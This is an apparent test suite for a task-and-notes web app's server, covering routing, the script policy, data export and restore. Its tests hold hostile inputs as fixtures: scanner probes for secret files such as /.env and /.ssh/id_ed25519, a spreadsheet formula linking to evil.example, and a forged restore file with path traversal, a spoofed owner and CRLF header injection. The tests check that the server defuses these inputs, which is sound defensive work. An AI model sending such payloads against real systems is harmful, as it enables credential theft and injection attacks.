    expect({ status: result.status, type: result.type }, path).toEqual({ status: 404, type: JSON_TYPE });
    expect(JSON.parse(result.text), path).toEqual({ message: "Route not found.", code: "not_found" });
    expect(result.text, path).not.toContain('<div id="root">');
  };

  it("serves the page for the app's own routes, and files that exist", async () => {
    for (const path of ["/", "/Today", "/Settings", "/Notes", "/RecentlyDeleted", "/login", "/auth/callback", "/Calendar?task=abc"]) {
      await expectThePage(path);
    }
    // The one route with a made-up part: the id is base64url, which can start
    // with "-" or "_" but never with a dot.
    await expectThePage("/connect/-_Zk3vQ9x0aB7cD1eF2gH3iJ4kL5mN6o");

    expect(await get("/assets/app-4f3a9c.js")).toEqual({
      status: 200,
      type: "application/javascript; charset=utf-8",
      cache: "public, max-age=31536000, immutable",
      text: SCRIPT,
    });
    // A file that isn't there is a 404, as it always was — never the page.
    await expectNotFound("/package.json");
    await expectNotFound("/assets/app-000000.js");
    await expectNotFound("/wp-admin/install.php");
    // With two slashes in front it is the same missing file, not a host called
    // "package.json" and the path "/".
    await expectNotFound("//package.json");
    // And "//" is a path too. Read as a host it was an error, so a 500.
    await expectThePage("//");
    await expectThePage("//[");
  });

  it("sends the page with its script policy, and files and refusals with the basic protections", async () => {
    const policyOf = async (path) => String((await invokeRaw(path)).headers["Content-Security-Policy"]);
    // 16 random bytes, as hex.
    const nonceIn = (policy) => /'nonce-([0-9a-f]{32})'/.exec(policy)?.[1];

    const page = await invokeRaw("/Today");
    const policy = String(page.headers["Content-Security-Policy"]);
    // No inline script in this page, so the only scripts it may run are the
    // site's own files, and one added on the way that carries this response's
    // nonce (Cloudflare's check for bots).
    expect(nonceIn(policy)).toBeTruthy();
    expect(policy).toBe(policyFor(PAGE, nonceIn(policy)));
    expect(policy).toContain(`script-src 'self' 'nonce-${nonceIn(policy)}';`);
    // The nonce is the response's own: the next one gets another.
    expect(nonceIn(await policyOf("/Today"))).not.toBe(nonceIn(policy));
    expect(page.headers["X-Frame-Options"]).toBe("DENY");
    // nosniff is what stops a browser running a file as a script when it isn't one.
    for (const path of ["/Today", "/assets/app-4f3a9c.js", "/.env", "/package.json"]) {
      expect((await invokeRaw(path)).headers["X-Content-Type-Options"], path).toBe("nosniff");
    }

    // A new build whose page has an inline script: the policy is worked out
    // again, and allows that script by its hash.
    const inline = "document.documentElement.classList.add('dark')";
    const pageFile = join(config.distRoot, "index.html");
    writeFileSync(pageFile, PAGE.replace("</head>", `<script>${inline}</script></head>`));
    // Its own modified time, so this doesn't lean on two writes landing in different clock ticks.
    utimesSync(pageFile, new Date(), new Date(Date.now() + 60_000));
    try {
      expect(await policyOf("/Today")).toContain(`script-src 'self' 'sha256-${hashOf("sha256").update(inline).digest("base64")}' 'nonce-`);
    } finally {
      writeFileSync(pageFile, PAGE);
    }
  });

  it("never answers a dotfile or a Vite dev-server path with the page", async () => {
    // What a scanner asked zephyrly.app for on 2026-10-06. None has a file
    // extension, so each used to get the page and a 200.
    for (const path of ["/.env", "/.npmrc", "/.git/config", "/.git/HEAD", "/.ssh/id_ed25519", "/@fs/src/.env", "/@fs/root/.env"]) {
      await expectNotFound(path);
    }
    // The dot can be in any part of the path, and /@ covers all of Vite's.
    for (const path of ["/a/.hidden", "/a/b/.git/config", "/.env/", "/..env", "/.../x", "/@vite/client", "/@id/x", "/@"]) {
      await expectNotFound(path);
    }
    // A dot or an @ is the same character however the request spells it.
    for (const path of ["/%2eenv", "/%2Egit/config", "/a/%2ehidden", "/%40fs/src/.env", "/%40vite/client"]) {
      await expectNotFound(path);
    }
    // Nor with a second slash in front, which used to turn ".env" into a host.
    for (const path of ["//.env", "//.git/config", "//@fs/src/.env", "/\\.env", "/.//.env"]) {
      await expectNotFound(path);
    }
    // Not even when such a file is really in the folder.
    const stray = await get("/.DS_Store");
    expect(stray.status).toBe(404);
    expect(stray.text).not.toContain("Finder");
  });

  it("still serves the page for any other path with no extension: that is what a route looks like", async () => {
    // Scanners ask for these too, but nothing tells them apart from a page
    // the app might have, so the server doesn't guess.
    for (const path of ["/console", "/graphql", "/actuator", "/debug/pprof", "/wp-admin", "/wp-json"]) {
      await expectThePage(path);
    }
    // A dot or an @ only counts at the start of a part (and an @ only in the first).
    for (const path of ["/v1.2/notes", "/a.b/c", "/people/@isaac", "/a@b", "/login?next=%2F.env"]) {
      await expectThePage(path);
    }
    // Broken percent-encoding is judged as written, not turned into an error.
    await expectThePage("/%zz");
    await expectThePage("/100%");
  });

  it("keeps /.well-known/ working exactly as before", async () => {
    // The sign-in documents for AI apps are answered before static files are
    // looked at, so the dot rule never sees them.
    const metadata = await get("/.well-known/oauth-authorization-server");
    expect({ status: metadata.status, type: metadata.type }).toEqual({ status: 200, type: JSON_TYPE });
    expect(JSON.parse(metadata.text).issuer).toBe("http://127.0.0.1:4173");
    const resource = await get("/.well-known/oauth-protected-resource");
    expect(resource.status).toBe(200);
    expect(JSON.parse(resource.text).resource).toBe("http://127.0.0.1:4173/api/mcp");

    // Anything else there was a plain 404 before there was a dot rule, and still is.
    await expectNotFound("/.well-known/openid-configuration");
    await expectNotFound("/.well-known/security.txt");
  });
});

describe("data export", () => {
  it("downloads everything a user has as a valid ZIP — and nothing of anyone else's, and no secrets", async () => {
    const owner = await login("exporter@example.com");
    const other = await login("someone-else@example.com");
    const headers = { Authorization: `Bearer ${owner}`, "Content-Type": "application/json" };
    const me = (await invoke("/api/apps/test-app/entities/User/me", { headers })).body;

    const post = async (entity, body, token = owner) =>
      (await invoke(`/api/apps/test-app/entities/${entity}`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body,
      })).body;

    const trip = await post("Task", {
      title: 'Trip, "big" one',
      description: '=HYPERLINK("http://evil.example","click")',
      due_date: "2026-10-01",
      tags: ["travel", "family"],
    });
    await post("Task", { title: "Pack bags", parent_id: trip.id, due_date: "2026-09-30" });
    await post("Note", { title: "Plans/2026", content_text: "Line one\nLine two" });
    const day = newSchedule({ start: 7 * 60, end: 9 * 60 });
    day.slots[0].text = "Breakfast";
    await post("Note", { title: "Saturday", content_text: "Hidden while it's a schedule", schedule_json: JSON.stringify(day) });
    await post("DeletedNote", { note_id: "note_old", title: "Old idea", content_text: "gone" });
    await post("Task", { title: "Not yours", due_date: "2026-10-01" }, other);

    // A connected calendar, with credentials that must never leave the server.
    const now = new Date().toISOString();
    db.prepare(
      `INSERT INTO calendar_integrations (id, app_id, user_id, provider, external_account_id, external_account_email,
         access_token_enc, refresh_token_enc, scopes, status, is_default, created_date, updated_date)
       VALUES ('int_1', 'test-app', ?, 'google', 'sub-1', 'exporter@gmail.com', 'SECRET-ACCESS', 'SECRET-REFRESH', '', 'active', 1, ?, ?)`
    ).run(me.id, now, now);
    db.prepare(
      `INSERT INTO integration_calendars (id, app_id, integration_id, external_calendar_id, summary, item_kind, sync_enabled, created_date, updated_date)
       VALUES ('cal_1', 'test-app', 'int_1', 'primary', 'Work', 'task', 1, ?, ?)`
    ).run(now, now);

    // One attachment on disk, one whose file has gone missing.
    const rel = `test-app/${me.id}/${trip.id}/att_1_boarding.pdf`;
    const pdf = Buffer.from("%PDF-1.4 boarding pass");
    mkdirSync(join(tempDir, "attachments", "test-app", me.id, trip.id), { recursive: true });
    writeFileSync(join(tempDir, "attachments", rel), pdf);
    const insertAttachment = db.prepare(
      `INSERT INTO task_attachments (id, app_id, user_id, task_id, filename, mime_type, size_bytes, storage_path, is_image, created_date)
       VALUES (?, 'test-app', ?, ?, ?, 'application/pdf', ?, ?, 0, ?)`
    );
    insertAttachment.run("att_1", me.id, trip.id, "Boarding.PDF", pdf.length, rel, now);
    insertAttachment.run("att_2", me.id, trip.id, "lost.pdf", 10, `test-app/${me.id}/${trip.id}/att_2_lost.pdf`, now);

    const result = await invokeRaw("/api/apps/test-app/export", { headers: { Authorization: `Bearer ${owner}` } });
    expect(result.statusCode).toBe(200);
    expect(result.headers["Content-Type"]).toBe("application/zip");
    expect(Number(result.headers["Content-Length"])).toBe(result.body.length);
    const fileName = /filename="(zephyrly-export-\d{4}-\d{2}-\d{2})\.zip"/.exec(String(result.headers["Content-Disposition"]))?.[1];
    expect(fileName).toBeTruthy();

    const files = readZip(result.body);
    const at = (path) => files.get(`${fileName}/${path}`);
    expect(at("README.txt")?.toString()).toContain("Never included: passwords");

    const data = JSON.parse(at("data.json").toString());
    expect(data.format).toBe("zephyrly-export");
    expect(data.account.email).toBe("exporter@example.com");
    expect(data.tasks.map((t) => t.title).sort()).toEqual(["Pack bags", 'Trip, "big" one']);
    expect(data.notes.map((n) => n.title).sort()).toEqual(["Plans/2026", "Saturday"]);
    expect(data.recently_deleted.notes.map((n) => n.title)).toEqual(["Old idea"]);
    expect(data.priorities.length).toBeGreaterThan(0);
    expect(data.calendar_connections).toEqual([
      expect.objectContaining({
        provider: "google",
        account_email: "exporter@gmail.com",
        calendars: [expect.objectContaining({ name: "Work", holds: "tasks", synced: true })],
      }),
    ]);
    expect(data.attachments.find((a) => a.id === "att_2").file).toBeNull();

    // Nothing of the other account, and no credential anywhere in the archive.
    const everything = [...files.values()].map((b) => b.toString()).join("\n");
    expect(everything).not.toContain("Not yours");
    expect(everything).not.toContain("SECRET-ACCESS");
    expect(everything).not.toContain("SECRET-REFRESH");

    // The real file, under a folder named after its task (quotes stripped).
    expect(at("attachments/Trip, big one/Boarding.pdf")?.equals(pdf)).toBe(true);

    // Notes as Markdown, with a filename that can't escape its folder.
    expect(at("notes/Plans 2026.md")?.toString()).toBe("# Plans/2026\n\nLine one\nLine two\n");
    // A schedule note is its slots, then any text it keeps underneath.
    expect(at("notes/Saturday.md")?.toString()).toBe(
      "# Saturday\n\n- 7:00 AM – 8:00 AM: Breakfast\n- 8:00 AM – 9:00 AM\n\nHidden while it's a schedule\n"
    );

    // CSV: quoted properly, with the planted formula defused.
    const csv = at("tasks.csv").toString();
    expect(csv.startsWith("\ufeffTitle,Description")).toBe(true);
    expect(csv).toContain('"Trip, ""big"" one"');
    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example"",""click"")"`);
    expect(csv).toContain("travel; family");
    expect(csv).toContain('Pack bags,,todo,2026-09-30');
  });

  it("requires sign-in", async () => {
    const result = await invokeRaw("/api/apps/test-app/export");
    expect(result.statusCode).toBe(401);
  });
});


describe("restore from an export", () => {
  const BOUNDARY = "----zephyrly-test-boundary";
  /** A multipart body carrying one file, as a browser would send it. */
  const multipart = (bytes, filename = "export.zip") =>
    Buffer.concat([
      Buffer.from(
        `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: application/zip\r\n\r\n`
      ),
      bytes,
      Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
    ]);
  const restore = (token, bytes, filename) =>
    invoke("/api/apps/test-app/restore", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: multipart(bytes, filename),
    });
  const api = (token) => async (method, path, body) =>
    (await invoke(`/api/apps/test-app${path}`, {
      method,
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body,
    })).body;
  const exportOf = async (token) => {
    const result = await invokeRaw("/api/apps/test-app/export", { headers: { Authorization: `Bearer ${token}` } });
    expect(result.statusCode).toBe(200);
    return result.body;
  };
  const dataJsonOf = (zip) => {
    const files = readZip(zip);
    const name = [...files.keys()].find((n) => n.endsWith("/data.json"));
    return JSON.parse(files.get(name).toString("utf8"));
  };
  const linkDoc = (taskId) =>
    JSON.stringify({
      type: "doc",
      content: [{ type: "paragraph", content: [{ type: "text", text: "Call the plumber", marks: [{ type: "taskLink", attrs: { taskId } }] }] }],
    });

  const tripDay = JSON.stringify(changeEnd(newSchedule(), 7, 450).schedule);

  /** Account A: a bit of everything. */
  async function seedSource(email) {
    const a = await login(email);
    const as = api(a);
    const me = await as("GET", "/entities/User/me");
    const someday = await as("POST", "/entities/Priority", { name: "Someday", color: "purple", order: 9 });
    await as("POST", "/entities/SavedTag", { name: "home" });
    const trip = await as("POST", "/entities/Task", {
      title: "Plan the trip", due_date: "2026-10-01", task_time: "9:00AM", task_end_time: "10:30AM",
      reminder: "before:60", priority_id: someday.id, tags: ["home"], status: "todo",
    });
    await as("POST", "/entities/Task", { title: "Book flights", parent_id: trip.id, due_date: "2026-09-30" });
    await as("POST", "/entities/Note", {
      title: "Trip notes", content_text: "Call the plumber", content_json: linkDoc(trip.id), priority_id: someday.id, schedule_json: tripDay,
    });
    await as("POST", "/entities/DeletedTask", { task_id: "task_gone", title: "Old errand", due_date: "2026-09-01" });
    await as("POST", "/entities/DeletedNote", { note_id: "note_gone", title: "Old idea", content_text: "gone" });
    // From a connected calendar: sync brings these back, so restore skips them.
    db.prepare(
      `INSERT INTO tasks (id, app_id, title, created_by_id, created_by, created_date, updated_date, source_provider, source_kind, due_date)
       VALUES (?, 'test-app', 'Dentist (Google)', ?, ?, ?, ?, 'google', 'event', '2026-10-02')`
    ).run(`task_cal_${me.id}`, me.id, me.email, new Date().toISOString(), new Date().toISOString());
    // A file on the trip.
    const boarding = Buffer.from("%PDF-1.4 boarding pass for the trip");
    const upload = await invoke(`/api/apps/test-app/tasks/${trip.id}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${a}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="Boarding.pdf"\r\nContent-Type: application/pdf\r\n\r\n`),
        boarding,
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    expect(upload.statusCode).toBe(201);
    return { a, me, trip, someday, boarding };
  }

  it("brings everything into another account, owned by that account, and a second restore adds nothing", async () => {
    const { a, me: meA, trip, boarding } = await seedSource("restore-source@example.com");
    const zip = await exportOf(a);

    const b = await login("restore-target@example.com");
    const bs = api(b);
    const meB = await bs("GET", "/entities/User/me");

    const first = await restore(b, zip);
    expect(first.statusCode).toBe(200);
    expect(first.body.added).toEqual({ tasks: 2, notes: 1, priorities: 1, tags: 1, recentlyDeleted: 2, files: 1 });
    expect(first.body.notes.join(" ")).toContain("1 item from connected calendars skipped");

    const tasks = await bs("GET", "/entities/Task");
    const restoredTrip = tasks.find((t) => t.title === "Plan the trip");
    const flights = tasks.find((t) => t.title === "Book flights");
    expect(tasks.map((t) => t.title).sort()).toEqual(["Book flights", "Plan the trip"]);
    // A's ids are taken, so B's copies get fresh ones — and still point at each other.
    expect(restoredTrip.id).not.toBe(trip.id);
    expect(flights.parent_id).toBe(restoredTrip.id);
    expect(restoredTrip).toMatchObject({ task_time: "9:00AM", task_end_time: "10:30AM", reminder: "before:60", tags: ["home"] });

    // Priority matched by name to B's own (created, since B had no "Someday").
    const priorities = await bs("GET", "/entities/Priority");
    const someday = priorities.find((p) => p.name === "Someday");
    expect(someday).toMatchObject({ color: "purple" });
    expect(restoredTrip.priority_id).toBe(someday.id);

    // The note's task link follows the task to its new id.
    const [note] = await bs("GET", "/entities/Note");
    expect(note.content_json).toContain(restoredTrip.id);
    expect(note.content_json).not.toContain(trip.id);
    expect(note.priority_id).toBe(someday.id);
    expect(note.schedule_json).toBe(tripDay);

    expect((await bs("GET", "/entities/DeletedTask")).map((t) => t.title)).toEqual(["Old errand"]);
    expect((await bs("GET", "/entities/DeletedNote")).map((n) => n.title)).toEqual(["Old idea"]);
    expect((await bs("GET", "/entities/SavedTag")).map((t) => t.name)).toContain("home");

    // The file, byte for byte, on B's copy of the task and counted against B.
    const [attachment] = (await bs("GET", `/tasks/${restoredTrip.id}/attachments`)).attachments;
    expect(attachment).toMatchObject({ filename: "Boarding.pdf", mime_type: "application/pdf", size_bytes: boarding.length });
    const stored = db.prepare("SELECT storage_path FROM task_attachments WHERE id = ?").get(attachment.id).storage_path;
    expect(readFileSync(join(tempDir, "attachments", stored)).equals(boarding)).toBe(true);

    // Every restored row belongs to B; nothing of A's changed hands.
    for (const table of ["tasks", "notes", "priorities", "saved_tags", "deleted_tasks", "deleted_notes"]) {
      const owners = db.prepare(`SELECT DISTINCT created_by_id FROM ${table} WHERE created_by_id IN (?, ?)`).all(meA.id, meB.id);
      expect(owners.length).toBeGreaterThan(0);
    }
    expect(db.prepare(`SELECT COUNT(*) n FROM tasks WHERE created_by_id = ? AND title = 'Plan the trip'`).get(meA.id).n).toBe(1);
    expect(db.prepare(`SELECT user_id FROM task_attachments WHERE id = ?`).get(attachment.id).user_id).toBe(meB.id);

    // Again: already there, so nothing is added.
    const second = await restore(b, zip);
    expect(second.statusCode).toBe(200);
    expect(second.body.added).toEqual({ tasks: 0, notes: 0, priorities: 0, tags: 0, recentlyDeleted: 0, files: 0 });
    expect((await bs("GET", "/entities/Task")).length).toBe(2);
    expect((await bs(`GET`, `/tasks/${restoredTrip.id}/attachments`)).attachments).toHaveLength(1);

    // Restoring A's export into A adds nothing either.
    const own = await restore(a, zip);
    expect(own.body.added).toEqual({ tasks: 0, notes: 0, priorities: 0, tags: 0, recentlyDeleted: 0, files: 0 });
  });

  it("adds back only what's missing — a deleted task returns with its file, edits elsewhere are kept", async () => {
    const c = await login("restore-partial@example.com");
    const cs = api(c);
    const keep = await cs("POST", "/entities/Task", { title: "Keep me", due_date: "2026-10-01" });
    const lose = await cs("POST", "/entities/Task", { title: "Lose me", due_date: "2026-10-01" });
    const zip = await exportOf(c);

    await cs("PUT", `/entities/Task/${keep.id}`, { title: "Keep me (edited)" });
    // Deleted outright, not via Recently Deleted.
    db.prepare("DELETE FROM tasks WHERE id = ?").run(lose.id);

    const result = await restore(c, zip);
    expect(result.body.added.tasks).toBe(1);
    const titles = (await cs("GET", "/entities/Task")).map((t) => t.title).sort();
    expect(titles).toEqual(["Keep me (edited)", "Lose me"]);
    // Its id was free again, so it comes back under the same one.
    expect((await cs("GET", `/entities/Task/${lose.id}`)).title).toBe("Lose me");
  });

  it("leaves a task that's in Recently Deleted there", async () => {
    const d = await login("restore-trash@example.com");
    const ds = api(d);
    const task = await ds("POST", "/entities/Task", { title: "Binned", due_date: "2026-10-01" });
    const zip = await exportOf(d);
    await ds("POST", "/entities/DeletedTask", { task_id: task.id, title: "Binned" });
    await ds("DELETE", `/entities/Task/${task.id}`);

    const result = await restore(d, zip);
    expect(result.body.added.tasks).toBe(0);
    expect(result.body.notes.join(" ")).toContain("in Recently Deleted");
  });

  it("contains a hostile file: owners, ids and oversized fields from the file don't get through", async () => {
    const victim = await login("restore-victim@example.com");
    const vs = api(victim);
    const meVictim = await vs("GET", "/entities/User/me");
    const theirs = await vs("POST", "/entities/Task", { title: "Victim's task", due_date: "2026-10-01" });

    const attacker = await login("restore-attacker@example.com");
    const as = api(attacker);
    const hostile = {
      format: "zephyrly-export",
      version: 1,
      tasks: [
        // Claims the victim as owner and reuses the victim's task id.
        { id: theirs.id, title: "Planted", due_date: "2026-10-01", created_by_id: meVictim.id, created_by: meVictim.email },
        { id: "../../etc", title: "Odd id", due_date: "2026-10-01" },
        { id: "task_huge", title: "x".repeat(5000), due_date: "2026-10-01" },
        { id: "task_objects", title: { not: "text" }, due_date: "2026-10-01" },
        { id: "task_orphan", title: "Orphan", parent_id: "task_nowhere" },
        "not a record",
      ],
      notes: [{ id: "note_x", title: "Hi", created_by_id: meVictim.id, content_json: "{not json" }],
      priorities: [{ id: "p1", name: "" }],
      attachments: [{ id: "att_x", task_id: theirs.id, filename: "evil.html", mime_type: "text/html\r\nX-Evil: 1", file: "attachments/x/evil.html" }],
    };
    const result = await restore(attacker, Buffer.from(JSON.stringify(hostile)), "data.json");
    expect(result.statusCode).toBe(200);
    expect(result.body.added).toMatchObject({ tasks: 2, notes: 1 });
    expect(result.body.notes.join(" ")).toMatch(/3 records couldn't be read/);
    expect(result.body.notes.join(" ")).toMatch(/1 subtask skipped/);

    // The victim's task is untouched and the victim gained nothing.
    expect((await vs("GET", `/entities/Task/${theirs.id}`)).title).toBe("Victim's task");
    expect((await vs("GET", "/entities/Task")).map((t) => t.title)).toEqual(["Victim's task"]);
    expect(await vs("GET", "/entities/Note")).toEqual([]);

    // The attacker's copies are the attacker's, under fresh, safe ids.
    const planted = (await as("GET", "/entities/Task")).map((t) => ({ id: t.id, title: t.title }));
    expect(planted.map((t) => t.title).sort()).toEqual(["Odd id", "Planted"]);
    for (const t of planted) expect(t.id).toMatch(/^task_[0-9a-f-]{36}$/);
    // The planted file names a task that isn't the attacker's, so it's skipped.
    expect(db.prepare("SELECT COUNT(*) n FROM task_attachments WHERE filename = 'evil.html'").get().n).toBe(0);
  });

  it("explains what it can't use", async () => {
    const e = await login("restore-errors@example.com");
    const bad = async (bytes, filename = "export.zip") => (await restore(e, bytes, filename)).body;

    expect((await bad(Buffer.from("PK\u0003\u0004 definitely not a real zip"))).code).toBe("restore_bad_zip");
    expect((await bad(Buffer.from(JSON.stringify({ tasks: [] })), "data.json")).code).toBe("restore_not_export");
    expect((await bad(Buffer.from("hello"), "notes.txt")).code).toBe("restore_not_export");
    expect((await bad(Buffer.from(JSON.stringify({ format: "zephyrly-export", version: 2 })), "data.json")).code).toBe(
      "restore_newer_version"
    );
    const noData = await writeZip([{ name: "export/README.txt", data: "hi" }]);
    expect((await bad(noData)).code).toBe("restore_not_export");

    const unsigned = await invoke("/api/apps/test-app/restore", { method: "POST", headers: {}, body: "" });
    expect(unsigned.statusCode).toBe(401);
  });

  it("restores records from a bare data.json and says the files need the .zip", async () => {
    const { a } = await seedSource("restore-source-json@example.com");
    const data = dataJsonOf(await exportOf(a));
    const f = await login("restore-json-only@example.com");
    const result = await restore(f, Buffer.from(JSON.stringify(data)), "data.json");
    expect(result.body.added).toMatchObject({ tasks: 2, files: 0 });
    expect(result.body.notes.join(" ")).toContain("only data.json was uploaded");
  });

  it("takes an export made before names were read as UTF-8: real names, and no doubled files", async () => {
    const realName = "Résumé 日本.pdf";
    const oldName = Buffer.from(realName, "utf8").toString("latin1");
    const g = await login("restore-old-names@example.com");
    const task = await api(g)("POST", "/entities/Task", { title: "Job hunt", due_date: "2026-10-01" });
    const upload = await invoke(`/api/apps/test-app/tasks/${task.id}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${g}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${realName}"\r\nContent-Type: application/pdf\r\n\r\n`),
        Buffer.from("%PDF-1.4 résumé"),
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    // Stored the way the old upload parser left it, and exported that way.
    db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(oldName, upload.body.id);
    const zip = await exportOf(g);
    expect(dataJsonOf(zip).attachments.map((a) => a.filename)).toEqual([oldName]);

    // The boot repair fixes the stored name; the old export still matches it.
    createDatabase(config).close();
    expect((await restore(g, zip)).body.added.files).toBe(0);
    expect((await api(g)("GET", `/tasks/${task.id}/attachments`)).attachments.map((a) => a.filename)).toEqual([realName]);

    // Into another account, the file arrives under its real name.
    const h = await login("restore-old-names-target@example.com");
    expect((await restore(h, zip)).body.added).toMatchObject({ tasks: 1, files: 1 });
    const [copy] = await api(h)("GET", "/entities/Task");
    expect((await api(h)("GET", `/tasks/${copy.id}/attachments`)).attachments.map((a) => a.filename)).toEqual([realName]);
  });

  /** Upload a PDF to a task, as a browser would. */
  const uploadPdf = async (token, taskId, filename, bytes) => {
    const result = await invoke(`/api/apps/test-app/tasks/${taskId}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: application/pdf\r\n\r\n`),
        bytes,
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    expect(result.statusCode).toBe(201);
    return result.body;
  };

  it("a task back under its old id gets the files held for it — once, and as a live task's", async () => {
    const j = await login("restore-same-id@example.com");
    const js = api(j);
    const task = await js("POST", "/entities/Task", { title: "Taxes", due_date: "2026-10-01" });
    const w2 = Buffer.from("%PDF-1.4 W-2");
    const uploaded = await uploadPdf(j, task.id, "W-2.pdf", w2);
    const zip = await exportOf(j);
    // Deleted, and its Recently Deleted record never arrived: the file is held.
    await js("DELETE", `/entities/Task/${task.id}`);
    const held = () => db.prepare("SELECT COUNT(*) n FROM task_attachments WHERE task_id = ? AND task_deleted_at IS NOT NULL").get(task.id).n;
    expect(held()).toBe(1);

    const result = await restore(j, zip);
    expect(result.body.added).toMatchObject({ tasks: 1, files: 0 });
    // Its id was free, so it's back under it — with the file it had, not a
    // second copy from the archive.
    expect((await js("GET", `/entities/Task/${task.id}`)).attachment_count).toBe(1);
    expect((await js("GET", `/tasks/${task.id}/attachments`)).attachments.map((a) => a.id)).toEqual([uploaded.id]);
    expect(held()).toBe(0);
    // A live task's file now, so the held-file timer leaves it be.
    await invoke("/api/health");
    const bytes = await invokeRaw(`/api/apps/test-app/attachments/${uploaded.id}`, { headers: { Authorization: `Bearer ${j}` } });
    expect(bytes.body.equals(w2)).toBe(true);
  });

  it("a task in Recently Deleted comes across with its files, which come back when it's restored from there", async () => {
    const k = await login("restore-trash-files@example.com");
    const ks = api(k);
    const task = await ks("POST", "/entities/Task", { title: "Old receipts", due_date: "2026-10-01" });
    const receipt = Buffer.from("%PDF-1.4 receipt");
    await uploadPdf(k, task.id, "receipt.pdf", receipt);
    await ks("DELETE", `/entities/Task/${task.id}`);
    await ks("POST", "/entities/DeletedTask", { task_id: task.id, title: "Old receipts", due_date: "2026-10-01" });
    const zip = await exportOf(k);
    const inZip = [...readZip(zip).entries()].find(([name]) => name.endsWith("/attachments/Old receipts/receipt.pdf"));
    expect(inZip?.[1].equals(receipt)).toBe(true);

    const m = await login("restore-trash-files-target@example.com");
    const ms = api(m);
    expect((await restore(m, zip)).body.added).toMatchObject({ tasks: 0, recentlyDeleted: 1, files: 1 });
    // Held for the item in Recently Deleted, and counted against this account.
    expect((await ms("GET", "/attachments/usage")).biggest_tasks).toEqual([
      expect.objectContaining({ task_title: "Old receipts", file_count: 1, total_bytes: receipt.length, in_recently_deleted: true }),
    ]);
    expect((await ms("GET", "/attachments?q=receipt")).attachments).toEqual([]);
    // Again: already there, file included.
    expect((await restore(m, zip)).body.added).toMatchObject({ recentlyDeleted: 0, files: 0 });

    // Restored from Recently Deleted the way the app does it.
    const [record] = await ms("GET", "/entities/DeletedTask");
    const back = await ms("POST", "/entities/Task", { title: record.title, due_date: record.due_date, restores_task_id: record.task_id });
    await ms("DELETE", `/entities/DeletedTask/${record.id}`);
    const [file] = (await ms("GET", `/tasks/${back.id}/attachments`)).attachments;
    expect(file.filename).toBe("receipt.pdf");
    const bytes = await invokeRaw(`/api/apps/test-app/attachments/${file.id}`, { headers: { Authorization: `Bearer ${m}` } });
    expect(bytes.body.equals(receipt)).toBe(true);
    // The first account's copy is its own, still held in its Recently Deleted.
    expect((await ks("GET", "/attachments/usage")).biggest_tasks).toEqual([
      expect.objectContaining({ task_title: "Old receipts", in_recently_deleted: true }),
    ]);
  });
});

describe("a deleted task's files", () => {
  const BOUNDARY = "----zephyrly-held-files-boundary";
  const DAY = 24 * 60 * 60 * 1000;
  const api = (token) => async (method, path, body) =>
    (await invoke(`/api/apps/test-app${path}`, {
      method,
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body,
    })).body;
  const upload = async (token, taskId, filename, text) => {
    const result = await invoke(`/api/apps/test-app/tasks/${taskId}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: application/pdf\r\n\r\n`),
        Buffer.from(text),
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    expect(result.statusCode).toBe(201);
    return result.body;
  };
  /** Where a file's bytes are, read while its row still exists. */
  const pathOf = (attachmentId) =>
    join(tempDir, "attachments", db.prepare("SELECT storage_path FROM task_attachments WHERE id = ?").get(attachmentId).storage_path);
  const heldRows = (userId) =>
    db.prepare("SELECT id FROM task_attachments WHERE user_id = ? AND task_deleted_at IS NOT NULL").all(userId).map((r) => r.id);
  const filenames = async (as, taskId) => (await as("GET", `/tasks/${taskId}/attachments`)).attachments.map((a) => a.filename);
  const health = () => invoke("/api/health");

  /**
   * The app's delete (useOfflineMutation.deleteTasks): the task and each
   * subtask are deleted, and a snapshot goes to Recently Deleted. Online the
   * requests race; offline the deletes replay first — as here.
   */
  const deleteLikeTheApp = async (as, task, subtasks = []) => {
    for (const subtask of subtasks) await as("DELETE", `/entities/Task/${subtask.id}`);
    await as("DELETE", `/entities/Task/${task.id}`);
    return as("POST", "/entities/DeletedTask", {
      task_id: task.id,
      title: task.title,
      due_date: task.due_date,
      subtasks: subtasks.map((s) => ({ id: s.id, title: s.title, status: "todo" })),
    });
  };
  /** The app's restore (RecentlyDeleted.handleRestore): new tasks naming the ones they bring back, then the record goes. */
  const restoreLikeTheApp = async (as, record) => {
    const task = await as("POST", "/entities/Task", { title: record.title, due_date: record.due_date, restores_task_id: record.task_id });
    const subtasks = [];
    for (const s of record.subtasks) {
      subtasks.push(await as("POST", "/entities/Task", { title: s.title, parent_id: task.id, restores_task_id: s.id }));
    }
    await as("DELETE", `/entities/DeletedTask/${record.id}`);
    return { task, subtasks };
  };

  it("keeps them in Recently Deleted — on disk and counted, on no task — and a restore puts each back on its task", async () => {
    const token = await login("held-restore@example.com");
    const as = api(token);
    const me = await as("GET", "/entities/User/me");
